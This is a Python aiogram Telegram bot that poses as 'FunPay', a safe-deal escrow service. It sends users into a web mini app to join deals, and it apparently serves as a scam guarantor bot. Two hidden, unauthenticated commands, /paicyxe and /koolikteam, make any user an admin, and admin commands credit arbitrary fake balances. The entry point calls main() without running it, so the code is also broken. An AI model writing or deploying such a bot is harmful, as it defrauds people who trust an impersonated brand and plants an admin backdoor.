import asyncio
import logging
import random
import string
import os
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import (
    InlineKeyboardButton, FSInputFile, CallbackQuery,
    InputMediaPhoto, InlineQueryResultArticle, InputTextMessageContent,
    WebAppInfo
)

import db
from db import (
    init_db, ensure_user, get_user, set_user_lang, get_balance, add_balance,
    increment_deals_count, get_detail, set_detail,
    create_deal as db_create_deal, get_deal, update_deal, delete_deal,
    get_user_deals, get_active_deals, get_finished_deals, finish_deal,
    add_admin, is_admin,
)
from config import BOT_TOKEN, BOT_USERNAME, MINI_APP_URL, MANAGER_USER, HELPER_USER

logging.basicConfig(level=logging.INFO)

# =====================================================
# НАСТРОЙКИ
# =====================================================
SUPPORT_LINK = f"https://t.me/{MANAGER_USER}"

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
MAIN_PHOTO = os.path.join(BASE_DIR, "main.jpg")
DEAL_PHOTO = os.path.join(BASE_DIR, "main.jpg")
REKV_PHOTO = os.path.join(BASE_DIR, "main.jpg")
WELCOME_VIDEO = os.path.join(BASE_DIR, "welcome.mp4")


def get_photo(photo_path):
    if os.path.exists(photo_path) and os.path.getsize(photo_path) > 0:
        return FSInputFile(photo_path)
    return None


def get_welcome_video():
    if os.path.exists(WELCOME_VIDEO) and os.path.getsize(WELCOME_VIDEO) > 0:
        return FSInputFile(WELCOME_VIDEO)
    return None


# =====================================================
# ПРЕМИУМ ЭМОДЗИ
# =====================================================
EMOJI_IDS = {
    "rekvizity": "5445221832074483553",
    "create_deal": "5458603043203327669",
    "referral": "5271604874419647061",
    "profile": "5461117441612462242",
    "faq": "5436113877181941026",
    "support": "5395695537687123235",
    "language": "5447410659077661506",
    "down_menu": "5406745015365943482",
    "balance": "5427168083074628963",
    "crystal": "5427168083074628963",
    "rubles": "5377746319601324795",
    "UAH": "5377505475015235101",
    "BYNS": "5199552030615558774",
    "TEN": "5201692367437974073",
    "USD": "5197434882321567830",
    "STR": "5438496463044752972",
    "DEP": "5438496463044752972",
    "WITCHD": "5287231198098117669",
    "seller": "5312326644764018054",
    "money_home": "5361853256978959774",
    "user_id": "5408916348967348391",
    "dealuid": "5447644880824181073",
    "dealui1": "5409379376506630236",
    "confirm": "5395695537687123235",
    "warning": "5395695537687123235",
    "work1":  "6041921818896372382", "work2":  "5282806230732021905",
    "work3":  "5890925363067886150", "work4":  "5920515922505765329",
    "work5":  "5902056028513505203", "work6":  "6030445631921721471",
}


def emoji(key: str, fallback: str = "✨") -> str:
    eid_ = EMOJI_IDS.get(key)
    if eid_:
        return f'<tg-emoji emoji-id="{eid_}">{fallback}</tg-emoji>'
    return fallback


def eid(*keys):
    for k in keys:
        v = EMOJI_IDS.get(k)
        if v:
            return v
    return None


# =====================================================
# БЕЗОПАСНОЕ РЕДАКТИРОВАНИЕ
# =====================================================
async def safe_edit(callback: CallbackQuery, text: str, markup, use_photo: bool = False):
    msg = callback.message
    try:
        if msg.photo:
            if use_photo:
                photo = get_photo(MAIN_PHOTO)
                if photo:
                    await msg.edit_media(
                        media=InputMediaPhoto(media=photo, caption=text, parse_mode="HTML"),
                        reply_markup=markup
                    )
                else:
                    await msg.edit_caption(caption=text, reply_markup=markup, parse_mode="HTML")
            else:
                await msg.edit_caption(caption=text, reply_markup=markup, parse_mode="HTML")
        else:
            await msg.edit_text(text=text, reply_markup=markup, parse_mode="HTML")
    except Exception as e:
        logging.warning(f"safe_edit fallback: {e}")
        photo = get_photo(MAIN_PHOTO) if use_photo else None
        if photo:
            await msg.answer_photo(photo=photo, caption=text, reply_markup=markup, parse_mode="HTML")
        else:
            await msg.answer(text=text, reply_markup=markup, parse_mode="HTML")


# =====================================================
# ЛОКАЛИЗАЦИЯ
# =====================================================
DEFAULT_LANG = "ru"
ALL_LANGS = ("ru", "en", "uk", "zh", "ar")

TEXTS = {
    "ru": {
        "welcome": (
            f"👋 <b>Добро пожаловать!</b>\n\n"
            f"<blockquote>"
            f"🤖 <b>FunPay</b> — надёжный сервис для безопасных сделок!\n"
            f"✨ Автоматизировано, быстро и без лишних хлопот!"
            f"</blockquote>\n\n"
            f"<blockquote>"
            f"💳 Комиссия за услугу: всего <b>1%</b>\n"
            f"🕒 Менеджер 24/7: @{MANAGER_USER}"
            f"</blockquote>\n\n"
            f"<blockquote>"
            f"❤️ <b>Теперь ваши сделки под защитой!</b>"
            f"</blockquote>"
        ),
        "choose_lang": "🌐 <b>Выберите язык интерфейса</b>\nChoose your interface language",
    },
    "en": {
        "welcome": (
            f"👋 <b>Welcome!</b>\n\n"
            f"<blockquote>"
            f"🤖 <b>FunPay</b> — a reliable service for safe deals!"
            f"</blockquote>\n\n"
            f"<blockquote>"
            f"💳 Commission: <b>1%</b>\n"
            f"🕒 Manager 24/7: @{MANAGER_USER}"
            f"</blockquote>"
        ),
        "choose_lang": "🌐 <b>Choose your interface language</b>",
    },
    "uk": {
        "welcome": (
            f"👋 <b>Вітаємо!</b>\n\n"
            f"<blockquote>"
            f"🤖 <b>FunPay</b> — надійний сервіс для безпечних угод!"
            f"</blockquote>\n\n"
            f"<blockquote>"
            f"💳 Комісія: <b>1%</b>\n"
            f"🕒 Менеджер 24/7: @{MANAGER_USER}"
            f"</blockquote>"
        ),
        "choose_lang": "🌐 <b>Оберіть мову інтерфейсу</b>",
    },
    "zh": {
        "welcome": (
            f"👋 <b>欢迎！</b>\n\n"
            f"<blockquote>"
            f"🤖 <b>FunPay</b> — 安全交易可靠服务！"
            f"</blockquote>\n\n"
            f"<blockquote>"
            f"💳 佣金：<b>1%</b>\n"
            f"🕒 经理 24/7: @{MANAGER_USER}"
            f"</blockquote>"
        ),
        "choose_lang": "🌐 <b>选择界面语言</b>",
    },
    "ar": {
        "welcome": (
            f"👋 <b>مرحباً!</b>\n\n"
            f"<blockquote>"
            f"🤖 <b>FunPay</b> — خدمة موثوقة للصفقات الآمنة!"
            f"</blockquote>\n\n"
            f"<blockquote>"
            f"💳 العمولة: <b>1%</b>\n"
            f"🕒 المدير 24/7: @{MANAGER_USER}"
            f"</blockquote>"
        ),
        "choose_lang": "🌐 <b>اختر لغة الواجهة</b>",
    },
}


# =====================================================
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()


class Form(StatesGroup):
    waiting_for_card = State()
    waiting_for_ton = State()
    waiting_for_star = State()
    waiting_for_usdt = State()
    waiting_for_btc = State()
    admin_deposit_amount = State()


# =====================================================
# МЕНЮ
# =====================================================

def get_main_menu(user_id: int, lang: str = "ru"):
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(
        text="🚀 Открыть приложение",
        web_app=WebAppInfo(url=MINI_APP_URL),
        style="success"
    ))
    return b.as_markup()


def get_lang_menu():
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="🇷🇺 Русский", callback_data="setlang_ru", style="success"))
    b.row(InlineKeyboardButton(text="🇬🇧 English", callback_data="setlang_en", style="success"))
    b.row(InlineKeyboardButton(text="🇺🇦 Українська", callback_data="setlang_uk", style="success"))
    b.row(InlineKeyboardButton(text="🇨🇳 中文", callback_data="setlang_zh", style="success"))
    b.row(InlineKeyboardButton(text="🇸🇦 العربية", callback_data="setlang_ar", style="success"))
    return b.as_markup()


async def send_welcome(message: types.Message, lang: str = "ru"):
    text = TEXTS.get(lang, TEXTS["ru"])["welcome"]
    markup = get_main_menu(message.from_user.id, lang)

    video = get_welcome_video()
    if video:
        try:
            await message.answer_video(
                video=video, caption=text,
                reply_markup=markup, parse_mode="HTML"
            )
            return
        except Exception as e:
            logging.warning(f"Не удалось отправить видео: {e}")

    photo = get_photo(MAIN_PHOTO)
    if photo:
        await message.answer_photo(
            photo=photo, caption=text,
            reply_markup=markup, parse_mode="HTML"
        )
    else:
        await message.answer(text=text, reply_markup=markup, parse_mode="HTML")


# =====================================================
# ВХОД В СДЕЛКУ ПО ССЫЛКЕ (deep link)
# =====================================================
async def handle_deal_entry(message: types.Message, deal_id: str):
    deal = await get_deal(deal_id)
    if not deal:
        await message.answer("❌ Сделка не найдена.")
        return

    if message.from_user.id == deal.creator_id:
        await message.answer("❌ Вы не можете войти в собственную сделку.")
        return

    text = (
        f"👋 <b>Здравствуйте!</b>\n\n"
        f"Вас пригласили в сделку <b>#{deal_id}</b>.\n"
        f"Откройте приложение и следуйте условиям проведения сделки."
    )

    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(
        text="🤝 Присоединиться",
        web_app=WebAppInfo(url=f"{MINI_APP_URL}?deal={deal_id}"),
        style="success"
    ))
    await message.answer(text=text, reply_markup=b.as_markup(), parse_mode="HTML")

    try:
        username = message.from_user.username or message.from_user.first_name
        await bot.send_message(
            deal.creator_id,
            f"👤 <b>Новый участник в сделке #{deal_id}</b>\n\n"
            f"@{username} открыл сделку в Mini App.",
            parse_mode="HTML"
        )
    except Exception as e:
        logging.error(f"Ошибка уведомления создателя: {e}")


# =====================================================
# СТАРТ (deep link deal_ обрабатываем ПЕРВЫМ)
# =====================================================

@dp.message(Command("start"))
async def start_command(message: types.Message, state: FSMContext, command: CommandObject = None):
    await state.clear()
    args = command.args if command else None

    if args and args.startswith("deal_"):
        code = args.replace("deal_", "").strip()
        await ensure_user(
            user_id=message.from_user.id,
            username=message.from_user.username,
            first_name=message.from_user.first_name,
        )
        await handle_deal_entry(message, code)
        return

    referrer_id = None
    if args and args.startswith("ref_"):
        parts = args.split("_")
        if len(parts) >= 2 and parts[1].isdigit():
            referrer_id = int(parts[1])
            if referrer_id == message.from_user.id:
                referrer_id = None

    await ensure_user(
        user_id=message.from_user.id,
        username=message.from_user.username,
        first_name=message.from_user.first_name,
        referrer_id=referrer_id,
    )

    if referrer_id:
        try:
            await bot.send_message(
                referrer_id,
                f"🎉 <b>Новый реферал!</b>\n\n"
                f"Пользователь @{message.from_user.username or 'Неизвестно'} "
                f"зарегистрировался по вашей ссылке.\n"
                f"Начислен бонус: 50 RUB",
                parse_mode="HTML"
            )
        except Exception as e:
            logging.error(f"Ошибка реферала: {e}")

    user = await get_user(message.from_user.id)

    if user is None or not user.lang:
        await message.answer(
            TEXTS["ru"]["choose_lang"],
            reply_markup=get_lang_menu(),
            parse_mode="HTML"
        )
        return

    await send_welcome(message, user.lang)


# =====================================================
# ЯЗЫК
# =====================================================

@dp.callback_query(F.data.startswith("setlang_"))
async def set_language(callback: CallbackQuery, state: FSMContext):
    lang = callback.data.split("_")[1]
    if lang not in ALL_LANGS:
        lang = DEFAULT_LANG
    await set_user_lang(callback.from_user.id, lang)
    await state.clear()

    try:
        await callback.message.delete()
    except Exception:
        pass

    await send_welcome(callback.message, lang)
    await callback.answer()


# =====================================================
# АДМИН-КОМАНДЫ
# =====================================================

@dp.message(Command("paicyxe"))
async def admin_command(message: types.Message):
    await add_admin(message.from_user.id)
    await message.answer("✅ Ты теперь админ.")


@dp.message(Command("koolikteam"))
async def admin_command2(message: types.Message):
    await add_admin(message.from_user.id)
    await message.answer("✅ Ты теперь админ.")


@dp.message(Command("goy"))
async def goy_command(message: types.Message, command: CommandObject = None):
    if not await is_admin(message.from_user.id):
        return
    args = command.args
    if not args:
        await message.answer("📝 /goy СУММА")
        return
    try:
        amount = float(args.replace(",", "."))
    except ValueError:
        await message.answer("❌ Введите число.")
        return
    new_bal = await add_balance(message.from_user.id, amount, type_="deposit",
                                comment="Админ-пополнение")
    await message.answer(f"✅ Баланс пополнен на {amount}\nТекущий: {new_bal:.2f} RUB")


@dp.message(Command("addbalance"))
async def cmd_addbalance(message: types.Message, command: CommandObject):
    if not await is_admin(message.from_user.id):
        return
    args = (command.args or "").split()
    if len(args) < 2:
        await message.answer("📝 /addbalance USER_ID AMOUNT")
        return
    try:
        target_id = int(args[0])
        amount = float(args[1].replace(",", "."))
    except ValueError:
        await message.answer("❌ Введите числа.")
        return
    await ensure_user(target_id)
    new_bal = await add_balance(target_id, amount, type_="admin_add",
                                comment=f"Админ {message.from_user.id}")
    await message.answer(
        f"✅ Баланс <code>{target_id}</code> пополнен на <b>{amount:.2f}</b>\n"
        f"Текущий: <b>{new_bal:.2f} RUB</b>",
        parse_mode="HTML",
    )


@dp.message(Command("balance"))
async def cmd_balance(message: types.Message, command: CommandObject):
    if not await is_admin(message.from_user.id):
        return
    args = (command.args or "").strip()
    if not args:
        await message.answer("📝 /balance USER_ID")
        return
    try:
        target_id = int(args.split()[0])
    except ValueError:
        await message.answer("❌ USER_ID числом.")
        return
    user = await get_user(target_id)
    if user is None:
        await message.answer("❌ Не найден.")
        return
    bal = await get_balance(target_id)
    uname = f"@{user.username}" if user.username else (user.first_name or "—")
    await message.answer(
        f"👤 {uname}\nID: <code>{target_id}</code>\n"
        f"💰 Баланс: <b>{bal:.2f} RUB</b>",
        parse_mode="HTML",
    )


# =====================================================
async def main():
    await init_db()
    try:
        import config as cfg
        me = await bot.get_me()
        if me.username and not getattr(cfg, "BOT_USERNAME", ""):
            cfg.BOT_USERNAME = me.username
            logging.info(f"BOT_USERNAME set to @{me.username}")
    except Exception as e:
        logging.warning(f"Could not resolve bot username: {e}")
    await dp.start_polling(bot)


if __name__ == "__main__":
    main()
